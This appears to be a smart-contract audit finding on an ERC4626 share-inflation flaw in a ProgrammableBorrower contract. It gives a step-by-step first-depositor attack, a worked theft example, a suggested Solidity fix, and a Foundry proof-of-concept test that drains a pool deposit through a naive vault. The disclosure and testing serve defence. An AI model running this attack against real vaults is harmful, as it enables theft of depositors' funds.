### Title
ERC4626 share inflation can steal the programmable borrower's epoch deposit - ([File: contracts/strategies/idle/ProgrammableBorrower.sol](contracts/strategies/idle/ProgrammableBorrower.sol))

### Summary

`ProgrammableBorrower` accepts any ERC4626 vault with a matching asset and deposits all idle epoch funds without validating the number or value of shares returned. An attacker who is an ordinary user of an empty, inflation-vulnerable ERC4626 vault can seed one share, donate assets to inflate the share price, and cause `ProgrammableBorrower` to receive zero shares for the pool's deposit. The attacker then redeems the vault's entire balance, including the deposited lender funds. [1](#0-0) [2](#0-1) 

### Finding Description

Initialization and `setVault` only validate that `vault.asset()` equals the CDO underlying. They do not require a non-empty vault, existing liquidity, inflation-resistant virtual shares, or a minimum share/value acceptance threshold. [3](#0-2) 

During `startEpoch`, `IdleCDOEpochVariant` sends the pool's surplus underlying to the configured borrower address, which is `ProgrammableBorrower` in programmable mode. [4](#0-3) 

`onStartEpoch` then deposits the entire underlying balance through `_depositToVault`. `_depositToVault` calls `vault.deposit(_assetAmount, address(this))` and merely emits the returned share count; it does not revert when `shares == 0` or when `convertToAssets(shares)` is materially below `_assetAmount`. [5](#0-4) [6](#0-5) 

For a naive ERC4626 implementation using `assets * totalSupply / totalAssets`, the attacker can:

1. Deposit `1` wei into an empty vault and receive `1` share.
2. Directly transfer `D` underlying to the vault, where `D` is at least the pool deposit `A`.
3. Let the honest manager call `startEpoch`.
4. `ProgrammableBorrower` deposits `A`, but receives `A * 1 / (D + 1) == 0` shares.
5. Redeem the attacker's single share for approximately `A + D + 1` underlying.

The accounting later recognizes that the borrower's vault shares are worth less than the epoch principal baseline, but the stolen assets have already been withdrawn from the external vault. [7](#0-6) 

### Impact Explanation

This is direct theft of lender principal. With `D >= A`, the attacker's investment is approximately `D + 1`, while redemption returns `A + D + 1`; attacker profit and credit-vault loss are approximately `A`.

For example, if the pool deposits 1,000,000 USDC, the attacker can deposit one base unit and donate 1,000,000 USDC. The pool receives zero shares, and the attacker redeems all shares for about 2,000,000 USDC, extracting the full 1,000,000 USDC pool deposit. The resulting vault loss can be realized through the CDO's explicit loss path, but realization does not recover the funds. [8](#0-7) [9](#0-8) 

### Likelihood Explanation

The attack requires the configured ERC4626 vault to be empty or economically empty before `ProgrammableBorrower` first deposits and to lack virtual-share or equivalent inflation protection. The attacker needs capital comparable to the first deposit, but no privileged role: the actions are an ordinary vault deposit, a direct underlying transfer, and a share redemption. [1](#0-0) 

Neither the factory deployment path nor `setVault` supplies a minimum first-deposit amount or validates vault share supply. `setVault` is restricted to honest owner/manager, but it intentionally permits migration to a new ERC4626 vault once the old position is unwound, which can expose the next epoch deposit to the same first-depositor condition. [10](#0-9) [3](#0-2) 

### Recommendation

Add deposit-output validation to `_depositToVault`, such as:

```solidity
uint256 shares = vault.deposit(_assetAmount, address(this));
if (shares == 0 || vault.convertToAssets(shares) < _assetAmount - maxSlippage) {
    revert InvalidAmount();
}
```

Also require a minimum acceptable share amount at the CDO lifecycle boundary, because the acceptable value may depend on the epoch deposit size. Prefer ERC4626 vaults with virtual-share inflation protection, require a minimum vault liquidity/supply during initialization and `setVault`, or seed the vault atomically during deployment before external users can establish an inflated first share. [6](#0-5)

pragma solidity 0.8.10;

import "forge-std/Test.sol";
import {IERC20Detailed} from "contracts/interfaces/IERC20Detailed.sol";
import {IERC4626} from "contracts/interfaces/IERC4626.sol";
import {IdleCDOEpochVariant} from "contracts/IdleCDOEpochVariant.sol";
import {ProgrammableBorrower} from "contracts/strategies/idle/ProgrammableBorrower.sol";

// Minimal naive ERC4626 used to model an external vault without inflation protection.
contract NaiveVault is IERC4626 {
    IERC20Detailed public immutable asset;
    string public constant name = "Naive Vault";
    string public constant symbol = "nVault";
    uint8 public immutable decimals;

    uint256 public totalSupply;
    mapping(address => uint256) public balanceOf;

    constructor(IERC20Detailed asset_) {
        asset = asset_;
        decimals = asset_.decimals();
    }

    function totalAssets() public view returns (uint256) {
        return asset.balanceOf(address(this));
    }

    function convertToShares(uint256 assets) public view returns (uint256) {
        uint256 supply = totalSupply;
        return supply == 0 ? assets : assets * supply / totalAssets();
    }

    function convertToAssets(uint256 shares) public view returns (uint256) {
        uint256 supply = totalSupply;
        return supply == 0 ? shares : shares * totalAssets() / supply;
    }

    function previewDeposit(uint256 assets) external view returns (uint256) {
        return convertToShares(assets);
    }

    function previewMint(uint256 shares) external view returns (uint256) {
        uint256 supply = totalSupply;
        return supply == 0 ? shares : shares * totalAssets() / supply;
    }

    function previewWithdraw(uint256 assets) external view returns (uint256) {
        uint256 supply = totalSupply;
        return assets * supply / totalAssets();
    }

    function previewRedeem(uint256 shares) external view returns (uint256) {
        return convertToAssets(shares);
    }

    function maxDeposit(address) external view returns (uint256) { return type(uint256).max; }
    function maxMint(address) external view returns (uint256) { return type(uint256).max; }
    function maxWithdraw(address owner) external view returns (uint256) {
        return convertToAssets(balanceOf[owner]);
    }
    function maxRedeem(address owner) external view returns (uint256) {
        return balanceOf[owner];
    }

    function deposit(uint256 assets, address receiver) external returns (uint256 shares) {
        shares = convertToShares(assets);
        asset.transferFrom(msg.sender, address(this), assets);
        totalSupply += shares;
        balanceOf[receiver] += shares;
    }

    function mint(uint256 shares, address receiver) external returns (uint256 assets) {
        uint256 supply = totalSupply;
        assets = supply == 0 ? shares : shares * totalAssets() / supply;
        asset.transferFrom(msg.sender, address(this), assets);
        totalSupply += shares;
        balanceOf[receiver] += shares;
    }

    function withdraw(uint256 assets, address receiver, address owner)
        external
        returns (uint256 shares)
    {
        shares = assets * totalSupply / totalAssets();
        totalSupply -= shares;
        balanceOf[owner] -= shares;
        asset.transfer(receiver, assets);
    }

    function redeem(uint256 shares, address receiver, address owner)
        external
        returns (uint256 assets)
    {
        assets = convertToAssets(shares);
        totalSupply -= shares;
        balanceOf[owner] -= shares;
        asset.transfer(receiver, assets);
    }
}

function testProgrammableBorrowerFirstDepositInflation() external {
    vm.createSelectFork("mainnet", FORK_BLOCK);

    uint256 poolDeposit = 1_000_000e6;
    address attacker = makeAddr("vaultUser");

    // Deploy the programmable-borrower CDO with an empty NaiveVault.
    // LP deposits normally through IdleCDOEpochVariant.

    deal(USDC, attacker, poolDeposit + 1, true);
    vm.startPrank(attacker);
    underlying.approve(address(naiveVault), type(uint256).max);

    // Seed one share and inflate the denominator to at least the pool deposit.
    naiveVault.deposit(1, attacker);
    underlying.transfer(address(naiveVault), poolDeposit);
    vm.stopPrank();

    // A KYC-passing lender deposits into the CDO.
    deal(USDC, lender, poolDeposit, true);
    vm.startPrank(lender);
    underlying.approve(address(cdoEpoch), poolDeposit);
    cdoEpoch.depositAA(poolDeposit);
    vm.stopPrank();

    // Honest manager starts the epoch. ProgrammableBorrower deposits A and gets 0 shares.
    vm.prank(manager);
    cdoEpoch.startEpoch();

    assertEq(naiveVault.balanceOf(address(programmableBorrower)), 0);
    assertEq(naiveVault.balanceOf(attacker), 1);

    uint256 attackerBefore = underlying.balanceOf(attacker);

    vm.prank(attacker);
    naiveVault.redeem(1, attacker, attacker);

    uint256 attackerAfter = underlying.balanceOf(attacker);

    // The attacker recovers the donation and extracts the full pool deposit.
    assertEq(attackerAfter - attackerBefore, poolDeposit + poolDeposit + 1);
    assertEq(programmableBorrower.vaultSharesBalance(), 0);
    assertEq(programmableBorrower.vaultLoss(), poolDeposit);
}

  /// @notice Hook called by IdleCDOEpochVariant when a new epoch starts.
  /// It deposits all on-hand assets into the vault and starts accounting.
  /// @param _pendingWithdraws pending withdraw requests amount to reserve for epoch end.
  function onStartEpoch(uint256 _pendingWithdraws) external nonReentrant {
    _checkOnlyIdleCDO();
    _accrueBorrowerInterest();
    // Reserve the amount IdleCDO expects to pull back at stopEpoch before the real borrower can draw again.
    epochPendingWithdraws = _pendingWithdraws;
    uint256 currentVaultAssets = _currentVaultAssets();
    uint256 bufferStartAssets = bufferStartVaultAssets;
    // Carry vault PnL generated while the pool was in the buffer into the new active epoch so it
    // is eventually realized in tranche prices at the next stopEpoch.
    bufferedVaultDelta = int256(currentVaultAssets) - int256(bufferStartAssets);
    bufferStartVaultAssets = 0;
    // Snapshot total assets before re-depositing idle cash so the epoch principal baseline uses the
    // exact pre-deposit amount instead of a post-deposit share-conversion round-down.
    uint256 startAssets = underlyingToken.balanceOf(address(this)) + currentVaultAssets;
    // Any idle balance left on the contract between epochs is parked immediately into the vault.
    _depositToVault(underlyingToken.balanceOf(address(this)), 0);
    // Reset the epoch accounting baseline from the exact pre-start total assets so the new epoch
    // does not treat the just-deposited idle balance as fresh vault profit or loss.
    epochStartVaultAssets = startAssets;
    epochDepositedToVault = 0;
    epochWithdrawnFromVault = 0;
    epochAccountingActive = true;
    emit EpochAccountingStarted(startAssets);
